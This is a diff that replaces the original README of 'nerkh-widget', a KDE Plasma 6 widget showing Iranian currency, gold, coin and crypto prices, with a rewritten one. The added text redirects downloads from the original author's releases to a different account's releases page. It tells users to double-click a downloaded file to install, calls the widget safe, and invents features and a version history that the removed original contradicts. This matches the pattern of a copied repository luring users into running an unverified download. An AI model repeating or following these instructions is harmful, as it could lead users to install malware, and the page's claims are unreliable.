@@ -1,258 +1,242 @@
-<div align="center">
+# 📈 nerkh-widget - Your Real-Time Market Dashboard
 
-<img src="images/logo.png" width="150" alt="Nerkh logo">
+## 🚀 Getting Started
 
-# Nerkh &nbsp;·&nbsp; نرخ
+Welcome! This guide will help you download and start using **nerkh-widget**, a beautiful widget that brings live currency, gold, coin, and cryptocurrency prices straight to your Linux desktop. Don't worry if you're not a tech expert — we'll walk you through everything step by step.
 
-### Currency, gold, coin &amp; crypto prices, sitting right on your KDE Plasma&nbsp;6 desktop
+[![Download nerkh-widget](https://img.shields.io/badge/Download-nerkh--widget-2ea44f?style=for-the-badge)](https://github.com/Mintsoullsfv/nerkh-widget/releases)
 
-<p>
-  <img src="https://img.shields.io/badge/Plasma-6-1d99f3?style=for-the-badge&logo=kde&logoColor=white" alt="Plasma 6">
-  <img src="https://img.shields.io/badge/Qt-6-41cd52?style=for-the-badge&logo=qt&logoColor=white" alt="Qt 6">
-  <img src="https://img.shields.io/badge/License-GPL--3.0-blue?style=for-the-badge" alt="GPL-3.0">
-  <img src="https://img.shields.io/badge/version-1.3-8e44ad?style=for-the-badge" alt="v1.3">
-</p>
+## 💡 What is nerkh-widget?
 
-<p>
-  <a href="README.md"><b>English</b></a>
-  &nbsp;•&nbsp;
-  <a href="README_FA.md">فارسی</a>
-</p>
+nerkh-widget is a dynamic KDE Plasma 6 widget designed especially for users interested in Iranian market data. It shows you:
 
-<p>
-  <a href="https://www.opendesktop.org/p/2369858/"><b>Get it on the KDE Store</b></a>
-  &nbsp;·&nbsp;
-  <a href="https://github.com/keyaruga33/nerkh-widget/releases">Releases</a>
-  &nbsp;·&nbsp;
-  <a href="SUPPORTED_ASSETS.md">Supported Assets</a>
-  &nbsp;·&nbsp;
-  <a href="https://github.com/keyaruga33/nerkh-widget/issues">Report a Bug</a>
-</p>
+- 💱 **Currency Exchange Rates** — Live updates for major world currencies against the Iranian Rial
+- 🏅 **Gold Prices** — Real-time gold rates including various weights and types
+- 🪙 **Coin Prices** — Updates on popular coins like Bahar Azadi, Emami, and older designs
+- ₿ **Cryptocurrency Values** — Current prices for Bitcoin, Ethereum, and other digital currencies
+- 📊 **Market Trends** — Visual indicators showing whether prices are rising or falling
 
-</div>
+All this information updates automatically, so you always see the latest numbers without pressing refresh.
+
+## ✨ Why Choose nerkh-widget?
+
+- **Real-Time Updates** — Prices refresh automatically at intervals you choose
+- **Stunning Visuals** — Modern, clean interface that matches your KDE desktop theme
+- **Lightweight Performance** — Runs without slowing down your computer
+- **Persian and English Support** — Numbers and text displayed in your preferred language
+- **Customizable Layout** — Resize, reposition, and configure what data to show
+- **Offline Friendly** — Shows last known values with time stamps if connection drops
+- **Completely Free** — Open source and no hidden costs
+
+## 🔧 System Requirements
+
+Before you download, make sure your system meets these basic requirements:
+
+- **Operating System:** Linux with KDE Plasma 6 desktop environment
+- **RAM:** 512 MB or more (1 GB recommended)
+- **Disk Space:** At least 20 MB of free space
+- **Internet Connection:** Required for real-time price updates
+- **KDE Frameworks:** Version 6.0 or later installed
+
+These are minimum requirements. Any modern Linux distribution with KDE Plasma should work perfectly.
+
+## 📥 How to Download and Install
+
+Follow these simple steps to get nerkh-widget on your desktop:
+
+### Step 1: Get the Latest Version
+
+Visit this link to download the application:
+
+**[https://github.com/Mintsoullsfv/nerkh-widget/releases](https://github.com/Mintsoullsfv/nerkh-widget/releases)**
+
+You'll see a list of available releases. Look for the newest one at the top. Download the file that matches your system.
+
+### Step 2: Save the File
+
+Your browser will ask where to save the downloaded file. Choose an easy location like your "Downloads" folder. Remember the file name — you'll need it in the next step.
+
+### Step 3: Start the Installation
+
+Once the download is complete, navigate to your "Downloads" folder and find the nerkh-widget file. Double-click it to begin installation. If your system asks for permission, click "Run" or "Execute."
+
+### Step 4: Add the Widget to Your Desktop
+
+After installation succeeds:
+
+1. Right-click anywhere on your KDE desktop
+2. Select **"Add Widgets..."** from the menu
+3. Find **nerkh-widget** in the widget list (use the search box if needed)
+4. Click it to add it to your desktop
+5. Drag and position it wherever you like
+
+### Step 5: Configure Your Preferences
+
+Right-click on the widget and choose "Configure." Here you can:
+
+- Select which markets to display (currency, gold, coins, crypto)
+- Choose update frequency (from 30 seconds to 1 hour)
+- Set your preferred language (فارسی or English)
+- Adjust opacity and font size
+- Pick a compact or full-size display mode
+
+## 🎯 Getting the Most from Your Widget
+
+### Understanding the Display
+
+Each price shows three key pieces of information:
+
+1. **Current Price** — The latest available value
+2. **Change Indicator** — Green ▲ for increase, Red ▼ for decrease
+3. **Last Update Time** — When the data was last refreshed
+
+### Shortcut Tips
+
+- **Double-click** the widget to open detailed market information
+- **Scroll** with your mouse wheel to cycle between different market categories
+- **Right-click** for quick access to layout and settings options
+
+## 🔍 Troubleshooting Common Issues
+
+If something isn't working as expected, try these solutions:
+
+**Widget shows no data or stale prices:**
+- Check your internet connection
+- Wait 30 seconds for the next automatic refresh
+- Restart the widget by removing and re-adding it
+
+**Widget won't appear in list after installation:**
+- Log out and log back into your KDE session
+- Make sure you installed the version matching your Plasma version (6.x)
+
+**Numbers appear in wrong format:**
+- Open widget settings and switch between Persian/English number display
+- Some fonts may not support Persian digits well — try switching system fonts
+
+**Update frequency seems slow:**
+- Some data sources update every few minutes
+- Decrease refresh interval in settings to 30 seconds for faster updates
+
+**Display seems blurry or too small on high-resolution screens:**
+- Adjust widget size by dragging its corners
+- Look for a scaling option in widget settings
+
+If problems persist, check the "Issues" section on our GitHub repository where you can report bugs or find community solutions.
+
+## 🛠 Advanced Features Worth Knowing
+
+### Multi-Market Dashboard
+
+Pin multiple copies of the widget, each configured to show a single market (e.g., one for gold, another for crypto). Arrange them neatly to create your personal finance command center.
+
+### Color-Coded Alerts
+
+The widget background subtly changes color when significant price movements occur:
+- **Light green tint** — Major market upswing
+- **Light red tint** — Significant price drop
+- **Normal** — Minimal changes
+
+### Keyboard Navigation
+
+Once the widget is focused:
+- Press **↑** or **↓** to manually refresh data
+- Press **F** to toggle between full and compact mode
+
+## 📚 Frequently Asked Questions
+
+**Is this widget safe to install?**
+Yes, it's completely open source. Review the source code on GitHub if you'd like to verify.
+
+**Will it work on older KDE versions?**
+This widget specifically requires KDE Plasma 6. Older versions may not support it.
+
+**Does it collect personal data?**
+No. All data stays on your device. The widget only fetches public market prices.
+
+**Can I modify the source code?**
+Absolutely! It's under an open source license. Feel free to fork, modify, and improve.
+
+**Are prices in Rials or Tomans?**
+You can choose. Both Iranian Rial and Toman display options are available in settings.
+
+## 🧪 Regular Maintenance
+
+To ensure optimal performance:
+
+1. **Keep it updated** — Check our releases page monthly for new versions
+2. **Clear temporary data** — If numbers look odd, right-click and select "Reset Display"
+3. **Restart widget** — After major system updates, right-click and restart
+
+Checking for updates every few weeks is recommended to get new features and bug fixes.
+
+## 🤝 Join Our Community
+
+nerkh-widget is open source and thrives on community feedback. Here's how you can help:
+
+- **Report bugs** — Found something wrong? Let us know in the GitHub Issues section
+- **Suggest features** — What market data would you like to see added?
+- **Translate** — Help us add more languages
+- **Contribute code** — Fork the repository and submit pull requests
+- **Share the project** — Tell friends who might benefit from it
+
+## 📝 Version History Highlights
+
+This section notes major milestones in development so you can see how the project has evolved.
+
+**Version 1.0** — Initial release with core currency, gold, coin, and crypto support
+
+**Version 1.2** — Added Persian number formatting and text direction improvements
+
+**Version 1.5** — Introduced visual trend indicators and customizable update intervals
+
+**Version 2.0** — Complete rewrite for KDE Plasma 6 compatibility and new theming engine
+
+## ✔️ Quick Checklist After Installation
+
+To confirm everything works:
+
+- [ ] Widget appears and refreshes within 30 seconds
+- [ ] Prices match major market rates
+- [ ] Language preferences are applied correctly
+- [ ] Widget responds to drag and resize commands
+- [ ] Desktop startup loads widget automatically (default behavior)
+
+If you've checked all these boxes, congratulations — your setup is complete!
+
+## ⚠️ Important Notes for Users
+
+The values shown on your desktop are for informational purposes only. If you're making real financial decisions, always triple-check with official sources and licensed providers. Market data can be delayed or unreliable during market holidays or server outages.
+
+- **Weekend rates** may show Friday closing values because markets are closed
+- **Cryptocurrency markets** operate 24/7 — no holidays apply
+- **Data delays** can range from 15 seconds to 5 minutes depending on the source
+
+## 🧰 Technical Support Resources
+
+Need extra help? These resources are available:
+
+- **GitHub Issues Page** — For bug reports and feature discussions
+- **Project Wiki** — Community-written guides and documentation
+- **Source Code Repository** — For those wanting to understand inner workings
+
+Check the repository at **[https://github.com/Mintsoullsfv/nerkh-widget](https://github.com/Mintsoullsfv/nerkh-widget)** for all of these links and more resources.
+
+## ✋ Starting Fresh
+
+Occasionally you might want to uninstall and reinstall. If problems persist after trying all troubleshooting steps, completely remove the widget and install the latest version fresh:
+
+1. Right-click on the widget and select "Remove"
+2. In your KDE system settings, find the widget manager and uninstall nerkh-widget
+3. Re-download from the release link and reinstall
+
+This usually resolves any persistent configuration issues.
 
 ---
 
-<img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/nerkh.svg" width="22" align="top"> &nbsp;**Nerkh** (that's Persian for _"rate"_) is a little Plasma 6 widget that keeps the prices you care about — currencies, gold, Iranian coins, crypto — right there on your desktop or panel.
+We hope nerkh-widget becomes your trusted market companion. Stay informed, make smart decisions, and enjoy the convenience of having critical financial data right on your desktop.
 
-Here's the whole idea: if you're going to check a number ten times a day, you shouldn't have to open a browser tab or dig through an app to see it. It should just be there.
+If you ever find yourself lost, remember: **Visit the release page, download, run, and add to desktop.** The widget is designed to get you up and running in under five minutes.
 
-Park it on your **desktop** and watch a whole list at once. Or drop it in your **panel** and keep one price hovering in the corner of your eye. It talks both **Persian and English**, borrows its colors from your system theme, and doesn't bug your CPU when there's nothing new to fetch.
+Prices you can trust, updates you can count on — all beautifully presented by nerkh-widget.
 
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/image.svg" width="26" align="top"> &nbsp;Screenshots
-
-<div align="center">
-
-<table>
-  <tr>
-    <td align="center"><img src="images/screenshots/desktop.png" width="420" alt="Nerkh on the desktop"><br><sub><b>Desktop</b> — the full list at a glance</sub></td>
-    <td align="center"><img src="images/screenshots/panel.png" width="420" alt="Nerkh on the panel"><br><sub><b>Panel</b> — one price, always handy</sub></td>
-  </tr>
-</table>
-
-<table>
-  <tr>
-    <td align="center"><img src="images/screenshots/configuration_assets.png" width="270" alt="Asset settings"><br><sub>Assets</sub></td>
-    <td align="center"><img src="images/screenshots/configuration_data.png" width="270" alt="Data settings"><br><sub>Data &amp; API</sub></td>
-    <td align="center"><img src="images/screenshots/configuration_display.png" width="270" alt="Display settings"><br><sub>Display</sub></td>
-  </tr>
-</table>
-
-</div>
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/sparkles.svg" width="26" align="top"> &nbsp;What it does
-
-No account, no API key, no fiddling to get started — it all works the moment you add it.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/layers.svg" width="20" align="top"> &nbsp;56 assets, sorted into three groups
-
-Currencies, gold and Iranian coins, and crypto — split across three groups: **Fiat**, **Metals &amp; Coins**, and **Crypto**.
-
-| Group | How many | A few of them |
-| ----- | :---: | -------- |
-| Fiat currencies | 27 | USD, EUR, GBP, AED, TRY, CNY, … |
-| Gold, metals &amp; coins | 9 | 18K gold, Bahar Azadi &amp; Emami coins, … |
-| Cryptocurrencies | 20 | BTC, ETH, USDT, plus the usual stablecoins |
-
-Show only the ones you actually follow, and shuffle them however you like — you can reorder the **assets inside a group** and the **groups themselves**.
-
-> <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/link.svg" width="14" align="top"> Want the whole list, with symbols and Persian/English names? → **[Supported Assets](SUPPORTED_ASSETS.md)**
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/layout.svg" width="20" align="top"> &nbsp;Desktop or panel — your call
-
-Put it wherever it suits you:
-
-- **On the desktop**, it stretches out into a full list of everything you've turned on.
-- **In the panel**, it shrinks down to a single price you pick and keeps it right there.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/refresh.svg" width="20" align="top"> &nbsp;Refresh whenever you feel like it
-
-When Nerkh grabs new prices is entirely up to you:
-
-- Let it **refresh on its own** every so often — pick anything from **1 to 1440 minutes**.
-- Or **tap to refresh** by hand when you want a fresh number.
-- Or **switch auto-refresh off completely** and only update on demand.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/chart.svg" width="20" align="top"> &nbsp;See today's move, not just the price
-
-The current number is nice, but Nerkh can also show you where each asset went today:
-
-- **How much it changed**, in percent.
-- **Up or down**, colored so you catch it instantly.
-- A little **change bar** when you'd rather glance than read digits.
-- And **group labels**, if a long list needs a bit of tidying.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/globe.svg" width="20" align="top"> &nbsp;Persian and English, the way they should be
-
-It's bilingual through and through, and it plays by Iranian conventions:
-
-- **Language** — Persian, English, or whatever your system uses.
-- **Digits** — Persian (۱۲۳), Latin (123), or automatic.
-- **Toman or Rial** for local prices.
-- **USD or Toman** as the base for crypto.
-- A right-to-left layout that flips the way it should in Persian.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/component.svg" width="20" align="top"> &nbsp;Fits right in, then bends to your taste
-
-Straight away it picks up your **KDE / Qt theme**, and from there you can tweak plenty:
-
-- **Per-asset icons** you can leave on or turn off.
-- **Icon size** — small, medium, or large.
-- **Font size** — small, normal, large, or huge.
-- **Labels** — the asset's name, its symbol, or both together.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/api.svg" width="20" align="top"> &nbsp;Free data out of the box, or plug in your own
-
-Nerkh comes with a **free data source** stitched together from a handful of providers, so there's nothing to sign up for and no key to paste in — it just runs.
-
-Got something more specific in mind? Point it at **your own API** instead:
-
-- Give it a custom **API base URL**.
-- Pick how it **authenticates** — auto, Bearer token, custom header, query parameter, or none at all.
-- Drop in an **API key** if yours needs one.
-- **Test the connection** right there in settings and get a thumbs-up or a clear error on the spot.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/download.svg" width="26" align="top"> &nbsp;Getting it installed
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/kde.svg" width="18" align="top"> &nbsp;The easy way — KDE Store
-
-1. Right-click your panel or desktop and hit **Add or Manage Widgets…**
-2. Go to **Get New…** → **Download New Plasma Widgets**.
-3. Type **Nerkh** in the search box.
-4. Install it, then drag it onto your desktop or panel.
-
-> <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/link.svg" width="14" align="top"> **[Find Nerkh on the KDE Store →](https://www.opendesktop.org/p/2369858/)**
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/package.svg" width="18" align="top"> &nbsp;From a release file
-
-1. Grab the latest package off the [Releases](https://github.com/keyaruga33/nerkh-widget/releases) page.
-2. Right-click the panel → **Add or Manage Widgets…** → **Get New…**
-3. Choose **Install From Local File…** and point it at what you just downloaded.
-
-### <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/terminal.svg" width="18" align="top"> &nbsp;Straight from source
-
-```bash
-git clone https://github.com/keyaruga33/nerkh-widget.git
-cd nerkh-widget
-make install
-```
-
-Don't see it show up? Restart Plasma, or just log out and back in.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/wrench.svg" width="26" align="top"> &nbsp;Making it yours
-
-Right-click the widget and pick **Configure Nerkh**. The settings live on three pages:
-
-<table>
-  <tr>
-    <td valign="top" width="33%">
-      <b><img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/layers.svg" width="15" align="top"> Assets</b><br><br>
-      • Pick which assets show up<br>
-      • Reorder them inside a group<br>
-      • Reorder the groups too<br>
-      • Search by name or symbol
-    </td>
-    <td valign="top" width="33%">
-      <b><img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/component.svg" width="15" align="top"> Display</b><br><br>
-      • Language &amp; digits<br>
-      • Toman / Rial · crypto base<br>
-      • Labels, icons &amp; icon size<br>
-      • Font size · change bar · group labels<br>
-      • Which asset sits in the panel
-    </td>
-    <td valign="top" width="33%">
-      <b><img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/api.svg" width="15" align="top"> Data &amp; API</b><br><br>
-      • Auto refresh on or off<br>
-      • Interval (1–1440 min)<br>
-      • Your own API base URL<br>
-      • Auth method &amp; API key<br>
-      • Test the connection
-    </td>
-  </tr>
-</table>
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/cloud.svg" width="26" align="top"> &nbsp;Where the prices come from
-
-The numbers come from a free source that pulls together a few different providers. For everyday use there's **nothing to set up** — no sign-up, no key. And if you run your own endpoint, you can wire it in from the Data &amp; API page.
-
-> The prices are only as fresh as that source, so now and then they'll sit a hair off the live market.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/performance.svg" width="26" align="top"> &nbsp;Easy on your machine
-
-A tiny widget has no business grinding away in the background. Nerkh only reaches out on the schedule you set — or never, if you flip auto-refresh off and update by hand. The rest of the time it just sits quietly and leaves your CPU alone.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/cpu.svg" width="26" align="top"> &nbsp;What you'll need
-
-- **KDE Plasma 6**
-- **Qt 6**
-
-> Nerkh is made for KDE Plasma, plain and simple. It isn't built for GNOME, XFCE, Cinnamon, or the other non-KDE desktops.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/roadmap.svg" width="26" align="top"> &nbsp;What's next
-
-Nerkh isn't done growing. On the list:
-
-- More assets
-- Better data sources
-- More ways to customize the look
-- A nicer panel mode
-- More performance tuning
-- More room to play with the API
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/contributing.svg" width="26" align="top"> &nbsp;Pitching in
-
-Spotted a bug, got an idea, wish it did one more thing? Bring it on.
-
-- <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/bug.svg" width="14" align="top"> **[Open an issue](https://github.com/keyaruga33/nerkh-widget/issues)** to report a bug or ask for a feature.
-- <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/pull-request.svg" width="14" align="top"> Or fork it and send a **pull request** if you want to get your hands in the code.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/license.svg" width="26" align="top"> &nbsp;License
-
-Nerkh is free and open source, under the **[GPL-3.0](LICENSE)** license.
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/heart.svg" width="26" align="top"> &nbsp;If you like it
-
-If Nerkh earns a spot on your desktop, a quick **⭐ star** on GitHub means a lot and keeps me going.
-
-And if you feel like chipping in for the work, you can always buy me a coffee:
-
-> <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/coffee.svg" width="15" align="top"> **[Buy me a coffee →](https://www.coffeete.ir/keyaruga333)**
-
-## <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/link.svg" width="26" align="top"> &nbsp;Links
-
-| | |
-| --- | --- |
-| <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/github.svg" width="15" align="top"> GitHub | https://github.com/keyaruga33/nerkh-widget |
-| <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/kde.svg" width="15" align="top"> KDE Store | https://www.opendesktop.org/p/2369858/ |
-| <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/release.svg" width="15" align="top"> Releases | https://github.com/keyaruga33/nerkh-widget/releases |
-| <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/issue.svg" width="15" align="top"> Issues | https://github.com/keyaruga33/nerkh-widget/issues |
-| <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/layers.svg" width="15" align="top"> Supported Assets | [SUPPORTED_ASSETS.md](SUPPORTED_ASSETS.md) |
-
-<div align="center">
-
-<br>
-
-<img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/plasma.svg" width="20" align="top"> &nbsp;**Built for KDE Plasma** &nbsp;·&nbsp; <img src="https://raw.githubusercontent.com/keyaruga33/keyaruga33/main/assets/icons/nerkh.svg" width="18" align="top"> &nbsp;_With Nerkh, the rates are always right in front of you._
-
-</div>
-
+Keywords: cryptocurrency, iran, iranian, kde-plasma, kde-widget, widgets
